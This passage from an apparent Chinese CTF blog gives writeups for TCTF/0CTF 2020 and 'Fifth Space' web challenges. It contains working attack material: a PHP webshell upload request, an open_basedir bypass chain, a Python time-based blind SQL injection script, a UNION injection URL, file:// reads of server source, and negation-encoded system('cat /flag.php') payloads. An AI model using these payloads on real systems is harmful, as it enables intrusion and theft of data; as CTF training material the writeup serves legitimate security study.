<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707100729914.png" alt="image-20200707100729914"></p>
<p>nu1l做法：</p>
<p>任意注册账号，只要info[“lottery”]后两位为f6，然后拼接原user的enc。</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707103111591.png" alt="image-20200707103111591"></p>
<blockquote>
<p>个人感觉出现漏洞的原因是在兑换彩票时，服务器没有检查兑换彩票的人是不是买彩票的人。应该禁止线上代理兑换彩票。</p>
</blockquote>
<h1 id="0x04-Cloud-Computing"><a href="#0x04-Cloud-Computing" class="headerlink" title="0x04 Cloud Computing"></a>0x04 Cloud Computing</h1><p>sandbox/0d3875a1ef234783393169ab868290f038826727/</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">'sandbox/'</span> . sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>] . $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) . <span class="string">'/'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">  mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">"action"</span>] ?? <span class="string">""</span>) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'pwd'</span>:</span><br><span class="line">    <span class="keyword">echo</span> $dir;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'upload'</span>:</span><br><span class="line">    $data = $_GET[<span class="string">"data"</span>] ?? <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (waf($data)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'waf sucks...'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="string">"$dir"</span> . <span class="string">"index.php"</span>, $data);</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'shell'</span>:</span><br><span class="line">    initShellEnv($dir);</span><br><span class="line">    <span class="keyword">include</span> $dir . <span class="string">"index.php"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有报错，过滤了很多利用eval(end(getallheaders()));</p>
<blockquote>
<p>利用error_reporting(-1);开启报错。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;eval(end(getallheaders())); HTTP&#x2F;1.1</span><br><span class="line">Host: pwnable.org:47780</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 33</span><br><span class="line">Connection: eval($_POST[cmd]);</span><br><span class="line"></span><br><span class="line">cmd&#x3D;error_reporting(-1);echo 233;</span><br></pre></td></tr></table></figure>

<p>不能看phpinfo()，利用报错可以知道有open_basedir限制，因为在sandbox里可以新建文件夹，然后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;eval(end(getallheaders())); HTTP&#x2F;1.1</span><br><span class="line">Host: pwnable.org:47780</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 241</span><br><span class="line">Connection: eval($_POST[cmd]);</span><br><span class="line"></span><br><span class="line">cmd&#x3D;chdir(&#39;sandbox&#x2F;0d3875a1ef234783393169ab868290f038826727&#x2F;&#39;);mkdir(&quot;img&quot;);chdir(&quot;img&quot;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707210915967.png" alt="image-20200707210915967"></p>
<p>然后读flag。是乱码，看wp说是用foremost得到flag，没有试成功。</p>
<h1 id="0x05-Cloud-Computing-v2"><a href="#0x05-Cloud-Computing-v2" class="headerlink" title="0x05 Cloud Computing v2"></a>0x05 Cloud Computing v2</h1><blockquote>
<p>var_dump(get_defined_functions(1));可以得到可用的函数。</p>
</blockquote>
<p>web go逆向，代码同上一题，禁了<code>chdir、chr、dir、scandir、mb_send_mail、ob_end_clean、ob_get_contents、ob_start、readdir、realpath</code>这些函数。</p>
<p>不能用chdir来绕过open_basedir。内网开了80端口，</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707222532253.png" alt="image-20200707222532253"></p>
<p>下载/agent</p>
<p>之后就是逆向了。。。。。。。。。。。。。。。。</p>
<h1 id="0x06-amp2020"><a href="#0x06-amp2020" class="headerlink" title="0x06 amp2020"></a>0x06 amp2020</h1><p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200706211703521.png" alt="image-20200706211703521"></p>
<p><a href="http://pwnable.org:33000/users/login" target="_blank" rel="noopener">http://pwnable.org:33000/users/login</a></p>
<p>参考</p>
<p><a href="https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/" target="_blank" rel="noopener">https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/</a></p>
<p><a href="http://igml.top/2020/06/29/2020-TCTF-0CTF-部分wp/" target="_blank" rel="noopener">http://igml.top/2020/06/29/2020-TCTF-0CTF-%E9%83%A8%E5%88%86wp/</a></p>
<p><a href="https://cjm00n.top/CTF/tctf-2020-wp.html" target="_blank" rel="noopener">https://cjm00n.top/CTF/tctf-2020-wp.html</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>第五空间智能安全大赛Web题解</title>
    <url>/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p> 第五空间web题目题解</p>
<a id="more"></a>

<h1 id="0x01-美团外卖"><a href="#0x01-美团外卖" class="headerlink" title="0x01 美团外卖"></a>0x01 美团外卖</h1><p><a href="http://www.zip源码泄露，审计源码，在daochu.php中存在sql注入，" target="_blank" rel="noopener">www.zip源码泄露，审计源码，在daochu.php中存在sql注入，</a></p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624212541399.png" alt="image-20200624212541399"></p>
<p>可以看到没有任何过滤，该页面不用登录也可以访问这个界面，而且也有回显。由于不知道sms和content表的列数，开始测试没有成功。</p>
<p>采用时间盲注，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://119.3.183.154/daochu.php?"</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		payload=<span class="string">"type=2&amp;imei=\" and if((ascii(mid((select group_concat(table_NAME) from information_schema.tableS where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;),benchmark(10000000,sha(1)),0)-- -"</span></span><br><span class="line">		payload=<span class="string">"type=2&amp;imei=\" and if((ascii(mid((select group_concat(column_NAME) from information_schema.columnS where table_schema=database() and table_name='admin'),&#123;&#125;,1))&gt;&#123;&#125;),benchmark(10000000,sha(1)),0)-- -"</span></span><br><span class="line">		payload=<span class="string">"type=2&amp;imei=\" and if((ascii(mid((select upass admin where id &gt;0 ),&#123;&#125;,1))&gt;&#123;&#125;),benchmark(10000000,sha(1)),0)-- -"</span></span><br><span class="line">		url_1=url+payload.format(i,mid)</span><br><span class="line">		<span class="keyword">print</span> url_1</span><br><span class="line">		s_time=time.time()</span><br><span class="line">		r=requests.get(url_1,proxies=proxies)</span><br><span class="line">		e_time=time.time()</span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> e_time-s_time&gt;<span class="number">1</span>:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag) </span><br><span class="line"></span><br><span class="line"><span class="comment">#admin,content,hint,mac,sms</span></span><br><span class="line"><span class="comment">#id uname upass  hints</span></span><br></pre></td></tr></table></figure>

<p>可以得到hint表中的hints为  see_the_dir_956c110ef9decdd920249f5fed9e4427</p>
<p>然后访问/956c110ef9decdd920249f5fed9e4427，得到的还是登录的界面</p>
<p>admin表中</p>
<p>uname:  admin  </p>
<p>upass: qweasdzxc  </p>
<p>好像没有id字段</p>
<p>但是登录失败，看登录的代码逻辑</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624223319101.png" alt="image-20200624223319101"></p>
<p>按代码中的来看，数据库中的upass应该为MD5字符串，这里就应该登不进去了。</p>
<p>然后继续审计代码，在lib/webuploader/0.1.5/server/preview.php看到了写文件的操作，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 此页面用来协助 IE6/7 预览图片，因为 IE 6/7 不支持 base64</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">$DIR = <span class="string">'preview'</span>;</span><br><span class="line"><span class="comment">// Create target dir</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists($DIR)) &#123;</span><br><span class="line">    @mkdir($DIR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cleanupTargetDir = <span class="keyword">true</span>; <span class="comment">// Remove old files</span></span><br><span class="line">$maxFileAge = <span class="number">5</span> * <span class="number">3600</span>; <span class="comment">// Temp file age in seconds</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($cleanupTargetDir) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_dir($DIR) || !$dir = opendir($DIR)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 100, "message": "Failed to open temp directory."&#125;, "id" : "id"&#125;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (($file = readdir($dir)) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $tmpfilePath = $DIR . DIRECTORY_SEPARATOR . $file;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Remove temp file if it is older than the max age and is not the current file</span></span><br><span class="line">        <span class="keyword">if</span> (@filemtime($tmpfilePath) &lt; time() - $maxFileAge) &#123;</span><br><span class="line">            @unlink($tmpfilePath);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$src = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"#^data:image/(\w+);base64,(.*)$#"</span>, $src, $matches)) &#123;</span><br><span class="line"></span><br><span class="line">    $previewUrl = sprintf(</span><br><span class="line">        <span class="string">"%s://%s%s"</span>,</span><br><span class="line">        <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTPS'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTPS'</span>] != <span class="string">'off'</span> ? <span class="string">'https'</span> : <span class="string">'http'</span>,</span><br><span class="line">        $_SERVER[<span class="string">'HTTP_HOST'</span>],</span><br><span class="line">        $_SERVER[<span class="string">'REQUEST_URI'</span>]</span><br><span class="line">    );</span><br><span class="line">    $previewUrl = str_replace(<span class="string">"preview.php"</span>, <span class="string">""</span>, $previewUrl);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $base64 = $matches[<span class="number">2</span>];</span><br><span class="line">    $type = $matches[<span class="number">1</span>];</span><br><span class="line">   <span class="keyword">if</span> ($type === <span class="string">'jpeg'</span>||$type===<span class="string">'php'</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no hacker"</span>);</span><br><span class="line">        <span class="comment">#$type = 'jpg';</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = md5($base64).<span class="string">".$type"</span>;</span><br><span class="line">    $filePath = $DIR.DIRECTORY_SEPARATOR.$filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists($filePath)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "result" : "'</span>.$previewUrl.<span class="string">'preview/'</span>.$filename.<span class="string">'", "id" : "id"&#125;'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $data = base64_decode($base64);</span><br><span class="line">        file_put_contents($filePath, $data);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "result" : "'</span>.$previewUrl.<span class="string">'preview/'</span>.$filename.<span class="string">'", "id" : "id"&#125;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 100, "message": "un recoginized source"&#125;&#125;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接访问<a href="http://119.3.183.154/lib/webuploader/0.1.5/server/preview.php是404，然后将sql注入出来的956c110ef9decdd920249f5fed9e4427接到后面，" target="_blank" rel="noopener">http://119.3.183.154/lib/webuploader/0.1.5/server/preview.php是404，然后将sql注入出来的956c110ef9decdd920249f5fed9e4427接到后面，</a></p>
<p><a href="http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/preview.php" target="_blank" rel="noopener">http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/preview.php</a></p>
<p>可以访问，会将php://input输入的内容写到文件中，格式为data:image/jpg;base64,dfdgassdga（类似这种）</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224023437.png" alt="image-20200624224023437"></p>
<p>提示说已经有木马在e98a4571cf72b798077d12d6c94629.php</p>
<p>然后访问，显示getfile，尝试get传file值，可以得到flag。</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224201195.png" alt="image-20200624224201195"></p>
<p>赛后发现可以直接利用回显注出数据。</p>
<p>首先确定type为2时，sms表的列数。</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200625110000373.png" alt="image-20200625110000373"></p>
<p>有八列，然后查数据，</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200625110234553.png" alt="image-20200625110234553"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;daochu.php?type&#x3D;1&amp;imei&#x3D;%22%20union%20select%201,2,hints,4,5,hints%20from%20hint--%20-</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224404494.png" alt="image-20200624224404494"></p>
<h1 id="0x02-do-you-know"><a href="#0x02-do-you-know" class="headerlink" title="0x02 do you know"></a>0x02 <strong>do you know</strong></h1><ul>
<li>非预期：</li>
</ul>
<p>从题目逻辑上来看，这题应该是用SSRF+XXE+反序列化，但是</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224624983.png" alt="image-20200624224624983"></p>
<p>这里用的是$_SERVER[‘QUERY_STRING’]来获取get输入的值，可以利用url编码绕过，直接利用file协议读文件，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br><span class="line">%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%69%6e%64%65%78%2e%70%68%70</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624225042417.png" alt="image-20200624225042417"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;xxe.php</span><br><span class="line">%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%78%78%65%2e%70%68%70</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624225155654.png" alt="image-20200624225155654"></p>
<p>依次得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hints.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#there is an main.php</span></span><br><span class="line"><span class="comment">#“大佬，要不咱们用一个好长好长的数字的md5做通信密码吧”</span></span><br><span class="line"><span class="comment">#“那你给我算一个出来”</span></span><br><span class="line"><span class="comment">#“好的”</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#小白打开了win10的calc，开始计算8129947191207+1992100742919</span></span><br><span class="line"><span class="comment">#然后他直接用鼠标复制了结果，计算md5值</span></span><br><span class="line"><span class="comment">#“好了大佬，10122047934126的md5值”</span></span><br><span class="line"><span class="comment">#“6dc6a29df1d7d33166bba5e17e42d2ea对吧”</span></span><br><span class="line"><span class="comment">#“哈？？？不是3e3e7d453061d953bce39ed3e82fd2a1吗”</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#“咱们对一下数字？”</span></span><br><span class="line"><span class="comment">#‭10122047934126‬</span></span><br><span class="line"><span class="comment">#10122047934126</span></span><br><span class="line"><span class="comment">#“这不是一样的吗....咋就md5不一样了.......”</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#找出来到底哪里出了问题，就可以看这道web题目了</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $object;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $variable;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $o = <span class="keyword">$this</span>-&gt;object;</span><br><span class="line">        $m = <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">        $v = <span class="keyword">$this</span>-&gt;variable;</span><br><span class="line">        $o-&gt;$m();</span><br><span class="line">        <span class="keyword">global</span> $$v;</span><br><span class="line">        $answer = file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">global</span> $answer;</span><br><span class="line">        <span class="keyword">echo</span> $answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'‬'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'‬'</span>])-&gt;CaptureTheFlag();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you do not pass the misc'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以知道flag在flag.php中，然后读flag.php。</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224856202.png" alt="image-20200624224856202"></p>
<h1 id="0x03-hate-php"><a href="#0x03-hate-php" class="headerlink" title="0x03 hate-php"></a>0x03 hate-php</h1><p>题目直接给了源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i'</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You are too good for me'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'You deserve better'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用取反绕过，开始用的assert(next(getallheaders()))，看网上说改UA就可以执行php代码，测试失败，可以用assert(end(getallheaders()))，end直接取的是Connection，直接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)()</span><br><span class="line">phpinfo()</span><br><span class="line">(~%89%9E%8D%A0%9B%8A%92%8F)((~%9A%91%9B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()))</span><br><span class="line">var_dump(end(getallheaders()))</span><br><span class="line">(~%9A%91%9B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)())</span><br><span class="line">end(getallheaders())</span><br><span class="line">(~%8C%86%8C%8B%9A%92)((~%9A%91%9B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()))</span><br><span class="line">system(end(getallheaders()))</span><br></pre></td></tr></table></figure>

<p>然后</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624230617477.png" alt="image-20200624230617477"></p>
<p>后来看到参数也可以用取反绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//print_r(get_defined_functions()['internal']);</span></span><br><span class="line">$a = <span class="string">"system"</span>; <span class="comment">//%8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(~$a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$b = <span class="string">"cat /flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$b);</span><br><span class="line"></span><br><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624231048058.png" alt="image-20200624231048058"></p>
<h1 id="0x04-zzm’s-blog"><a href="#0x04-zzm’s-blog" class="headerlink" title="0x04 zzm’s blog"></a>0x04 <strong>zzm’s blog</strong></h1><p>得到pom.xml</p>
